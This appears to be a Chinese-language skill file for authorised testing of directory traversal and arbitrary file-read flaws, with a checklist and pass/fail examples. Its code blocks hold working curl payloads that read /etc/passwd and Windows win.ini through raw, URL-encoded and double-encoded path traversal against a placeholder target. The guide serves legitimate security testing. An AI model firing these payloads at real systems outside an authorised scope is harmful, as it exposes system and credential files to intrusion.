
# 目录遍历与文件读取测试

## 适用场景
- 需要验证下载、导出、模板、图片、日志或调试接口是否可越界读文件。
- 需要用 [top-web-vulnerabilities](../top-web-vulnerabilities/SKILL.md) 归类和解释根因。
- 需要和 [broken-authentication](../broken-authentication/SKILL.md) 联动确认是否存在鉴权绕过读取。

## 核心约束
- 优先使用只读且低敏的探针文件验证可达性。
- 同时测试原始、URL 编码、双编码和平台分隔符变体。
- 先定位规范化边界，再判断是路径拼接、解码顺序还是白名单问题。
- 生产环境默认不读取高敏文件，除非范围明确允许。

## 代码模式
```bash
curl -sS 'https://target.example/download?file=../../../../etc/passwd'
curl -sS 'https://target.example/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd'
curl -sS 'https://target.example/view?path=..\..\Windows\win.ini'
```

## 检查清单
- 确认拼接点、解码顺序、规范化函数和白名单策略。
- 测试 Linux/Windows 路径风格和绝对路径输入。
- 比较返回码、错误消息、响应长度和缓存行为。
- 把可读路径、前置条件和影响分层说明。

## 反模式

### FAIL: 单一 payload 就下结论

```bash
curl 'https://target/download?file=../../../../etc/passwd' → 400
# 结论：不存在路径遍历
```

→ 只测了原始形式；URL 编码、双编码、Windows 路径可能绕过。

### PASS: 覆盖多种编码和平台变体

```bash
curl 'https://target/download?file=..%2f..%2f..%2fetc%2fpasswd'      # URL 编码
curl 'https://target/download?file=..%252f..%252fetc%252fpasswd'      # 双编码
curl 'https://target/download?file=..\..\Windows\win.ini'             # Windows
curl 'https://target/download?file=/etc/passwd'                        # 绝对路径
# 对比响应码 + 响应长度 + 错误消息差异
```

- 发现错误回显就直接判定可读取任意文件。
- 在生产环境直接读取密钥等高敏文件。
